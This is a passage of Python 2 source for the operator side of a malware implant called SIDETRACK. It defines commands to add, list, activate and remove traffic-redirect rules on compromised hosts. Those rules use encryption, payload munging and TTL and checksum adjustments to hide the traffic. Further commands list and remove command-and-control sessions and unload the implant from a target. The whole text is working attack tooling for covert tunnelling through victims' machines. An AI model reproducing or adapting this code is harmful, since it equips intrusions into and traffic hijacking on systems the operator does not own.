        elif file == -1: # Single rule to stdout
            res = self.GetRule(rule)
            if res[0] == 0:
                return res
            printOut = res[1]
            for i in range(1,4):
                sd = self.GetSection(rule,i)
                if sd[0] == 0:
                    return (0,printOut + sd[1])
                printOut = printOut + sd[1]
            return (1,printOut + self.postRuleString())
        else: # Single rule to file
            out = open(file,"w")
            res = self.GetRule(rule)
            if res[0] == 0:
                return res
            printOut = res[1]
            for i in range(1,4):
                sd = self.GetSection(rule,i)
                if sd[0] == 0:
                    return (0,printOut + sd[1])
                printOut = printOut + sd[1]
            printOut = printOut + self.postRuleString()
            out.write(printOut)
            out = None
            return (1,printOut)


#############################################################################
# REDIRADD class
# opcode 0x23
#############################################################################
class SIDECMD_REDIRADD(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "rediradd"
        self.usage = "rediradd <protocol | all> <host_A> <host_B> [-insert <rule>]\n         [-ttl (reset | <num>)] [-nocrypto] [-afix] [-tfix] [-samesum]\n         [-longevity <time>] [-conntimeout <time>]\n\n         <host_A>/<host_B> format: <ip_address>[:<local_port>/<remote_port>]\n"
        self.info = "Add a REDIRECT rule into SIDETRACK's rule set"
        self.op = 0x23L


    def parseProto(self,proto):
        origproto = proto
        if type(proto) == type ('a'):
            proto = string.upper(proto)[:1]
            if proto == "T":
                proto = 6
            elif proto == "U":
                proto = 17
            elif proto == "I":
                proto = 1
            elif proto == "A":
                proto = 0
            else:
                raise ValueError, origproto
        return proto

    def parseHostInfo(self,host):
        #split the ip from the ports
        res = string.split(host,":")
        if len(res) == 1:
            try:
                host = None
                ipaddr = self.ConvertIP(res[0])
            except:
                host = base.sessionDict[res[0]]
                ipaddr = self.ConvertIP(host.target.GetIP())
            return host,ipaddr,-1,-1
        elif len(res) == 2:
            ports = string.split(res[1],"/")
            if len(ports) != 2:
                raise ValueError, host
            if ports[0] == "*":
                ports[0] = -1
            else:
                ports[0] = eval(ports[0])
            if ports[1] == "*":
                ports[1] = -1
            else:
                ports[1] = eval(ports[1])
            try:
                host = None
                ipaddr = self.ConvertIP(res[0])
            except:
                host = base.sessionDict[res[0]]
                ipaddr = self.ConvertIP(host.target.GetIP())
            return host,ipaddr,ports[0],ports[1]
        else:
            raise ValueError, host
                
    
    def run(self,protocol,attacker,target,
            opt0=None,opt1=None,opt2=None,opt3=None,opt4=None,opt5=None,
            opt6=None,opt7=None,opt8=None,opt9=None,first=1):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg,0)
        
        optList = [opt0,opt1,opt2,opt3,opt4,opt5,opt6,opt7,opt8,opt9]
        allProtoAT = 0
        allProtoTA = 0
        allRedir = 0
        ttl_reset = 1
        ttl_mod = 0
        munge = 1
        encrypt = 0
        afix = 1
        tfix = 1
        ident = 0
        seq = 0
        insert = 0
        samesum = 0
        longevity = 14400
        conn_to = 14400
        cmd = None
        localredir = 0
        
        if first:
            munge = 0
            encrypt = 1

        protocol = self.parseProto(protocol)
        if protocol == 0:
           allRedir = 1
           
        host,A_ip,A_port,SA_port = self.parseHostInfo(attacker)
        host2,T_ip,T_port,ST_port = self.parseHostInfo(target)

        if host != None:
            hpn = host.implant.parent.name
            myname = host.name
            attacker = re.sub(myname,hpn,attacker)
            cmd = host.GetCommand('rediradd')
            res = cmd.run(protocol,attacker,\
                          "%s:%d/%d"%(self.implant.session.target.ip,SA_port,A_port),\
                          opt0,opt1,opt2,opt3,opt4,opt5,opt6,opt7,opt8,opt9,0)
            if res[0] == 0:
                return res
            if res[2] != 0 and cmd.implant.session.target.hasAnotherAddress == 1:
                A_ip = struct.pack("!L",res[2])

        if SA_port == -1 and T_port != -1:
            base.db(1,"problem")
            raise ValueError, "Invalid ports"
        if SA_port != -1 and T_port == -1:
            base.db(1,"problem")
            raise ValueError, "Invalid ports"
        if ST_port == -1 and A_port != -1:
            base.db(1,"problem")
            raise ValueError, "Invalid ports"
        if ST_port != -1 and A_port == -1:
            base.db(1,"problem")
            raise ValueError, "Invalid ports"

        if SA_port == -1 and T_port == -1:
            allProtoAT = 1
            SA_port = 0
            T_port = 0
        if ST_port == -1 and A_port == -1:
            allProtoTA = 1
            ST_port = 0
            A_port = 0


        # Parse the args
        i=0
        while i < len(optList):
            if optList[i] == None:
                break
            elif string.upper(optList[i])[:3] == '-TT':
                i = i+1
                if type(optList[i]) == type(1):
                    ttl_mod = optList[i]
                    if optList[i] < 0:
                        ttl_reset = 0
                    else:
                        ttl_reset = 1
                elif string.upper(optList[i])[:1] == 'R':
                    ttl_mod = 0
                    ttl_reset = 1
                elif optList[i][0] == '+' or optList[i][0] == '-':
                    ttl_mod = eval(optList[i])
                    ttl_reset = 0
                else:
                    raise ValueError, optList[i]
                
                #if ttl_reset == 0:
                #    ttl_mod = struct.pack("!H",ttl_mod)
                #else:
                #    ttl_mod = struct.pack("!h",ttl_mod)
    
            elif string.upper(optList[i])[:2] == '-I':
                i = i+1
                insert = optList[i]
            elif string.upper(optList[i])[:2] == '-L':
                i = i+1
                longevity = self.ConvertTime(optList[i])
            elif string.upper(optList[i])[:2] == '-C':
                i = i+1
                conn_to = self.ConvertTime(optList[i])
            elif string.upper(optList[i])[:2] == '-N':
                munge = 0
                encrypt = 0
            elif string.upper(optList[i])[:2] == '-E':
                encrypt = 1
            elif string.upper(optList[i])[:2] == '-A':
                afix = 0
            elif string.upper(optList[i])[:3] == '-TF':
                tfix = 0
            elif string.upper(optList[i])[:2] == '-S':
                samesum = 1
            else:
                raise ValueError, optList[i]
            i = i + 1

        if T_ip == self.ConvertIP(self.implant.session.target.ip):
            encrypt = 0
            munge = 0
            localredir = 1
            
        flags = 1 | afix << 1 | tfix << 2 | ttl_reset << 3 \
                | encrypt << 4 | munge << 5 | allRedir << 6 | allProtoAT << 7 \
                | allProtoTA << 8 | base.ccSupport << 9 | samesum << 10
        
        rd = crypto.GetRandom()
        if localredir == 0:
            ident = struct.unpack("!H",rd[0:2])[0]
        if munge:
            munge = struct.unpack("!L",rd[2:6])[0]
            if munge & 1L == 0:
                munge = munge + 1
            if munge & 0xffL == 1:
                munge = munge + 10
        if protocol == 6 and localredir == 0 and encrypt:
            seq = struct.unpack("!L", rd[22:26])[0]
        if encrypt:
            encrypt = struct.unpack("!LLLL",rd[6:22])
        else:
            encrypt = (0,0,0,0)
        base.db(2, seq)
        base.db(2, ident)
        self.redir =REDIRECT(self,insert,longevity,conn_to,protocol,A_ip,T_ip,\
                             ident,seq,munge,encrypt,ttl_mod,flags,\
                             A_port,SA_port,T_port,ST_port)
        ruleRes = self.redir.add()
        if ruleRes[0] and cmd != None:
            if cmd.redir != None:
                cmd.redir.next = self.redir
                self.redir.prev = cmd.redir
        return ruleRes


#############################################################################
# REDIRLIST class
# opcode 0x24
#############################################################################
class SIDECMD_REDIRLIST(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "redirlist"
        self.usage = "redirlist [rule]"
        self.info = "List redirect entries."
        self.op = 0x24L

    def parseReturn(self):
        self.ret, self.rule, self.longevity, self.conn_to, \
                  self.A_ip, self.T_ip, self.flags = \
                  struct.unpack("!LLLLLLH",self.data[:26])
        self.ttl_mod = struct.unpack("!H",'\000'+self.data[26:27])[0]
        self.protocol = struct.unpack("!H", '\000'+self.data[27:28])[0]
        self.conns, self.ATcount, self.TAcount, self.seen, self.munge, \
                    self.A_port, self.SA_port, self.T_port, self.ST_port, \
                    self.seq = struct.unpack("!LLLLLHHHHL",self.data[28:60])
        self.A_ip = self.ConvertToDot(self.A_ip)
        self.T_ip = self.ConvertToDot(self.T_ip)
        self.longevity = time.ctime(self.longevity-self.implant.timediff)[4:]
        if self.protocol == 1:
            self.protocol = "ICMP"
        elif self.protocol == 6:
            self.protocol = "TCP"
        elif self.protocol == 17:
            self.protocol = "UDP"
        elif self.protocol == 0:
            self.protocol = "ALL"
        else:
            self.protocol = eval("'%d'" % (self.protocol))

        if (self.flags & 0x1L):
            self.active = "ACTIVE"
        else:
            self.active = "INACTIVE"

        self.opts = ''
        if not (self.flags & 0x2L):
            self.opts = self.opts + '-afix '
        if not (self.flags & 0x4L):
            self.opts = self.opts + '-tfix '
        if (self.flags & 0x400L):
            self.opts = self.opts + '-samesum '
        if self.flags & 0x8L:
            if self.ttl_mod == 0:
                self.opts = self.opts + '-ttl reset '
            else:
                self.opts = self.opts + '-ttl %d ' % (self.ttl_mod)
        else:
            if self.ttl_mod > 127:
                self.opts = self.opts + '-ttl %d' % (self.ttl_mod-256)
            else:
                self.opts = self.opts + '-ttl +%d ' % (self.ttl_mod)
        if not (self.flags & 0x30L):
            self.opts = self.opts + '-nocrypto '

    def outputPorts(self,attacker,flags,ip,lport,rport):
        if flags & 0x40 or flags & 0x180 == 0x180:
            return ip
        if attacker and flags & 0x80:
            rport = '*'
        if attacker and flags & 0x100:
            lport = '*'
        if not attacker and flags & 0x80:
            lport = '*'
        if not attacker and flags & 0x100:
            rport = '*'
        if type(lport) != type('*'):
            lport = '%d' %(lport)
        if type(rport) != type('*'):
            rport = '%d' %(rport)

        return '%s:%s/%s' % (ip,lport,rport)
        
    def outputCurrent(self):
        res = '%-5d %s Connection timeout: %s  Expires: %s\n' % \
              (self.rule,self.active,\
               self.TimeConvert(self.conn_to),self.longevity)
        res = res + '      %s %s %s %s\n' % \
                  (self.protocol,
                   self.outputPorts(1,self.flags,self.A_ip,self.A_port,self.SA_port),
                   self.outputPorts(0,self.flags,self.T_ip,self.T_port,self.ST_port),
                   self.opts)
        res = res + '      Connections: %-4d   Last seen %s\n      A->T count: %-6d   T->A count: %-6d\n' % (self.conns, time.ctime(self.seen-self.implant.timediff)[4:], self.ATcount, self.TAcount)
        return (1, res)

    def listOne(self,rule):
        self.data = struct.pack("!LL",rule,0)
        self.Query()
        if self.op == 0x24L and self.res == 0x01L:
            self.parseReturn()
            return self.outputCurrent()
        else:
            return (0, "Implant did not return a valid response")

    def listAll(self):
        out = ''
        self.ret = 1
        self.rule = 0
        while self.ret == 1:
            self.data = struct.pack("!LL",0,self.rule)
            self.Query()
            if self.op == 0x24L and self.res == 0x01L:
                self.parseReturn()
                res = self.outputCurrent()
                if res[0] == 0:
                    return res
                else:
                    out = out + res[1]
            else:
                return (0, "Error receiving result")
        if self.ret == 2:
            return (1, "No rules to list")
        else:
            return (1, out)
        
    def run(self,rule=None):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")

        if rule == None:
            res = self.listAll()
        else:
            res = self.listOne(rule)

        return res



#############################################################################
# REDIRSET class
# opcode 0x25
#############################################################################
class SIDECMD_REDIRSET(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "redirset"
        self.usage = "redirset <rule|all> <active|inactive>"
        self.info = "Set a redirect rule as being active or inactive."
        self.op = 0x25L

    def run(self, rule, status):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if type(rule) == type("a") and string.upper(rule)[:1] == 'A':
            rule = 0
        if string.upper(status[:1]) == 'A':
            status = 1
        elif string.upper(status[:1]) == 'I':
            status = 0
        i=0
        while i < len(self.implant.rules):
            if self.implant.rules[i].remoteRuleNum == rule or rule == 0:
                res = self.implant.rules[i].set(status)
                if res[0] == 0:
                    return res
                elif rule != 0:
                    break
            i = i + 1
        base.db(3,res[1])
        if i == len(self.implant.rules) and rule != 0:
            return (0, "Rule does not exist")
        else:
            return (1, "Rule(s) set successfully")




#############################################################################
# CONNREMOVE class
# opcode 0x28
#############################################################################
class SIDECMD_CONNREMOVE(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "connrm"
        self.usage = "connrm <rule|all>"
        self.info = "Remove a connection entry (or all connection entries)"
        self.op = 0x28L

    def run(self, rule):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")
        if type(rule) == type("a") and string.upper(rule)[:1] == 'A':
            rule = 0
        self.data = struct.pack("!L",rule)
        self.Query()
        if self.op == 0x28L and self.res == 0x1L:
            return (1, "Connection(s) removed successfully")
        else:
            return (0, "Error removing connection(s)")
        

#############################################################################
# CONNLIST class
# opcode 0x27
#############################################################################
class SIDECMD_CONNLIST(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "connlist"
        self.usage = "connlist [-c <rule> | -r <redir>]"
        self.info = "Lists a (or all) connection rules"
        self.op = 0x27L

    def convertState(self,state):
        if state == 0:
            return "INIT"
        elif state == 1:
            return "SYN_SENT"
        elif state == 2:
            return "SYN_RCVD"
        elif state == 3:
            return "SYN_ACK_RCVD"
        elif state == 4:
            return "SYN_ACK_SENT"
        elif state == 5:
            return "ESTABLISHED"
        elif state == 6:
            return "FIN_SENT"

    def parseReturn(self):
        self.ret,self.rule,self.redir,self.longevity = struct.unpack("!LLLL",self.data[0:16])
        
        self.protocol = struct.unpack("!H", '\000'+self.data[16:17])[0]
        sendstate = struct.unpack("!H",'\000'+self.data[17:18])[0]
        recvstate = struct.unpack("!H",'\000'+self.data[18:19])[0]
        sender = struct.unpack("!H",'\000'+self.data[19:20])[0]
        
        self.at_cnt, self.ta_cnt, self.last, self.Aip, self.SAip, self.Tip,\
        self.STip, self.Aport, self.SAport, self.Tport, self.STport \
        = struct.unpack("!LLLLLLLHHHH",self.data[20:56])

        self.leftState = ''
        self.rightState = ''
        if self.protocol == 6:
            self.protocol = "TCP"
            if sender == 1:
                self.leftState = self.convertState(sendstate)
                self.rightState = self.convertState(recvstate)
            else:
                self.leftState = self.convertState(recvstate)
                self.rightState = self.convertState(sendstate)
        elif self.protocol == 17:
            self.protocol = "UDP"
        else:
            self.protocol = '%d' %(self.protocol)

        
    def outputCurrent(self):
        res = '%d %s Redir rule: %d Last seen: %s\n    %s:%d <-%s(%d)-> %s:%d\n    %s:%d <-%s(%d)-> %s:%d\n' % \
              (self.rule,self.protocol,self.redir,
               time.ctime(self.last+self.implant.timediff)[4:],
               self.ConvertToDot(self.Aip),self.Aport,
               self.leftState,self.at_cnt,
               self.ConvertToDot(self.SAip),self.SAport,
               self.ConvertToDot(self.STip),self.STport,
               self.rightState,self.ta_cnt,
               self.ConvertToDot(self.Tip),self.Tport)
        return (1,res)
    
    def listAll(self,redir):
        out = ''
        self.ret = 1
        self.rule = 0
        while self.ret == 1:
            self.data = struct.pack("!LLL",0,self.rule,redir)
            self.Query()
            if self.op == 0x27L and self.res == 0x01L:
                self.parseReturn()
                res = self.outputCurrent()
                if res[0] == 0:
                    return res
                else:
                    out = out + res[1]
            else:
                return (0, "Error receiving result")
        if self.ret == 2:
            return (1,"No connections to list")
        else:
            return (1,out)
        
    def listOne(self,rule):
        self.data = struct.pack("!LLL",rule,0,0)
        self.Query()
        if self.op == 0x27L and self.res == 0x01L:
            self.parseReturn()
            return self.outputCurrent()
        else:
            return (0, "Implant did not return a valid response")
        
    def run(self, option=None, value=None):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")
        rule = 0
        redir = 0
        if option != None:
            if option == '-c':
                rule = value
            elif option == '-r':
                redir = value
            else:
                raise TypeError, option

        if rule == 0:
            res = self.listAll(redir)
        else:
            res = self.listOne(rule)

        return res

#############################################################################
# REDIRREMOVE class
# opcode 0x26
#############################################################################
class SIDECMD_REDIRREMOVE(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "redirrm"
        self.usage = "redirrm <rule|all>"
        self.info = "Remove a redirect rule (or all redirect rules)"
        self.op = 0x26L

    def run(self, rule):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")

        removed = 0
        
        if type(rule) == type("a") and string.upper(rule)[:1] == 'A':
            rule = 0

        i = 0
        while i < len(self.implant.rules):
            if self.implant.rules[i].remoteRuleNum == rule or rule == 0:
                res = self.implant.rules[i].remove()
                if res[0] == 0:
                    return res
                removed = 1
                i = i - 1
            i = i + 1

        if removed == 0 or rule == 0:
            self.data = struct.pack("!L",rule)
            self.Query()
            if self.op == 0x26L and self.res == 0x1L:
                return (1, "Rule(s) removed successfully")
            else:
                return (0, "Error removing rule(s)")
        else:
            return res

#############################################################################
# CCLIST class
# opcode 0x29
#############################################################################
class SIDECMD_CCLIST(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "cclist"
        self.usage = "cclist"
        self.info = "List all of the command and control sessions"
        self.op = 0x29L

    def parseReturn(self):
        self.more,self.rule,self.longevity,self.srcip,self.dstip,\
         self.srcport,self.dstport = struct.unpack("!LLLLLHH",self.data[0:24])

        if self.more & 2L:
            self.current = "(CURRENT) "
        else:
            self.current = ""

        self.longevity = time.ctime(self.longevity-self.implant.timediff)[4:]
        self.srcip = self.ConvertToDot(self.srcip)
        self.dstip = self.ConvertToDot(self.dstip)

    def displayCurrent(self):
        # STUB: Make this better!
        if self.rule == 0xffffffffL:
            return ""
        res = "%d %s%s:%d<->%s:%d Expires: %s\n" % \
              (self.rule,self.current,self.srcip,self.srcport,\
               self.dstip,self.dstport,self.longevity)
        return res
    
    def run(self):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")

        res = ""
        last = 0L
        self.more = 1
        while self.more & 1L:
            self.data = struct.pack("!L",last)
            self.Query()
            if self.op == 0x29L and self.res == 0x1L:
                self.parseReturn()
                res = self.displayCurrent() + res
                last = self.rule
            else:
                return (0, "Error getting CC rules")
        return (1,res)


#############################################################################
# CCREMOVE class
# opcode 0x2a
#############################################################################
class SIDECMD_CCREMOVE(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "ccremove"
        self.usage = "ccremove <rule>"
        self.info = "Remove a command and control session (see also: done)"
        self.op = 0x2aL

    def run(self,rule):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")

        self.data = struct.pack("!L",rule)
        self.Query()
        if self.op == 0x2aL and self.res == 0x1L:
            return (1, "Session removed successfully")
        else:
            return (0, "Unable to remove CC session (note: you cannot remove yourself, see: done)")


#############################################################################
# UNLOAD class
# opcode 0x30
#############################################################################
class SIDECMD_UNLOAD(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "stunload"
        self.usage = "stunload <magic>"
        self.info = "Remove SIDETRACK from the target"
        self.op = 0x30L

    def run(self, magic):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if self.implant.version < 2.0:
            return (0, "This feature is only available in versions >= 2.0")
        self.data = struct.pack("!L",magic);
        self.Query()
        if self.op == 0x30L and self.res == 0x1L:
            return (1, "SIDETRACK successfully removed from target")
        else:
            return (0, "Cannot remove SIDETRACK");
        
base.RegisterImplant('SIDETRACK', SIDETRACK)

class REDIRECT(SIDECMD):
    def __init__(self, cmd, next, longevity, connection_timeout, protocol,\
                 A_ip, T_ip, ident, seq, munge, crypto_key, ttl_mod, flags, \
                 A_port, SA_port, T_port, ST_port):
        SIDECMD.__init__(self)
        self.protocol           = cmd.protocol
        self.implant            = cmd.implant
        self.session            = cmd.implant.session
        self.target             = cmd.implant.session.target
        self.longevity          = longevity
        self.nextRule           = next
        self.connection_timeout = connection_timeout
        self.proto              = protocol
        self.A_ip               = A_ip
        self.T_ip               = T_ip
        self.ident              = ident
        self.seq                = seq
        self.munge              = munge
        self.crypto_key         = crypto_key
        self.ttl_mod            = ttl_mod
        self.flags              = flags
        self.A_port             = A_port
        self.SA_port            = SA_port
        self.T_port             = T_port
        self.ST_port            = ST_port
        self.added = 0
        self.localRuleNum = None
        self.remoteRuleNum = None
        self.prev = None
        self.next = None
        self.ccPassthru = None

    def remove(self,direction=0):
        if self.added == 0:
            return (0, "Rule does not exist")

        if self.ccPassthru != None:
            cmd = self.ccPassthru.GetCommand('done')
            cmd.run()
        
        if direction != 1 and self.next != None:
            res = self.next.remove(2)
            if res[0] == 0:
                return (res[0], "Rule could not be removed: " + res[1])
            self.next = None

        if self.remoteRuleNum != None:
            self.op = 0x26L
            self.data = struct.pack("!L",self.remoteRuleNum)
            self.Query()
            if self.op == 0x26L and self.res == 0x1L:
                base.redir.delete(self.localRuleNum)
                self.added = 0
                self.localRuleNum = None
                self.implant.rules.remove(self)
                if direction != 2 and self.prev != None:
                    res = self.prev.remove(1)
                    if res[0] == 0:
                        return (0,"Rule %d removed: %s"%(self.remoteRuleNum,res[1]))
                return (1, "Rule %d removed"%(self.remoteRuleNum))
            else:
                return (0, "Rule could not be removed")
        else:
            base.redir.delete(self.localRuleNum)
            return (1, "Local rule removed")

    def set(self,value,direction=0):
        if self.added == 0:
            return (0, "Rule does not exist")
        
        if direction != 1 and self.next != None:
            res = self.next.set(value,2)
            if res[0] == 0:
                return(res[0], "Rule could not be set: " + res[1])

        if self.remoteRuleNum:
            self.op = 0x25L
            self.data = struct.pack("!LH",self.remoteRuleNum, value)
            self.Query()
            if self.op == 0x25L and self.res == 0x1L:
                base.redir.set(self.localRuleNum, value)
                if direction != 2 and self.prev != None:
                    res = self.prev.set(value,1)
                    if res[0] == 0:
                        return (0,"Rule %d set: %s"%(self.remoteRuleNum,res[1]))
                return (1, "Rule %d set"%(self.remoteRuleNum))
            else:
                return (0, "Rule could not be set")
        else:
            base.redir.set(self.localRuleNum, value)
            return (1, "Local rule set")
        
    def add(self, addremote=1):
        if self.added == 1:
            return (0, "Rule already exists", 0)
        AT_ip = 0

        if addremote:
            self.op = 0x23L
            self.data = struct.pack("!LLL",self.nextRule, self.longevity,\
                                    self.connection_timeout)
            self.data = self.data + self.A_ip + self.T_ip
            self.data = self.data + struct.pack("!HHLLLLLHHHHHHL",self.flags,\
                     (self.ttl_mod << 8 | self.proto), self.munge,\
                     self.crypto_key[0],self.crypto_key[1],self.crypto_key[2],\
                     self.crypto_key[3], self.ident, 0, self.A_port, \
                     self.SA_port, self.T_port, self.ST_port, self.seq)
            self.Query()
            if self.op == 0x23L and self.res == 0x01L:
                self.remoteRuleNum = struct.unpack("!L", self.data[0:4])[0]
		AT_ip = struct.unpack("!L", self.data[4:8])[0]
                self.ST_ip = self.data[4:8]
                res = base.redir.redir(self.longevity,self.connection_timeout,\
                                   self.ConvertIP(self.target.ip), \
                                   self.T_ip,\
                                   self.seq, self.munge, self.crypto_key, \
                                   self.flags, self.A_port, self.SA_port,\
                                   self.ident, self.proto)
                if res < 1:
                    self.op = 0x26L
                    self.data = struct.pack("!L",self.remoteRuleNum)
                    self.Query()
                    if self.op == 0x26L and self.res == 0x1L:
                        self.remoteRuleNum = None
                        return (0, "Local rule could not be added", AT_ip)
                    else:
                        return (0, "Local rule could not be added, remote rule may still exist", AT_ip)
                self.localRuleNum = res
                self.added = 1
                self.implant.rules.append(self)
                return (self.remoteRuleNum, "Rule %d added" %(self.remoteRuleNum), AT_ip)
            else:
                return (0, "Remote rule could not be added", AT_ip)
        else:
            self.remoteRuleNum = None
            res = base.redir.redir(self.longevity,self.connection_timeout,\
                                   self.ConvertIP(self.target.ip), \
                                   self.T_ip,\
                                   self.seq, self.munge, self.crypto_key, \
                                   self.flags, self.A_port, self.SA_port,\
                                   self.ident, self.proto)
            if res < 1:
                return (0, "Local rule could not be added", 0)
            self.added = 1
            self.localRuleNum = res
            return (1, "Local rule added", 0)
            
        
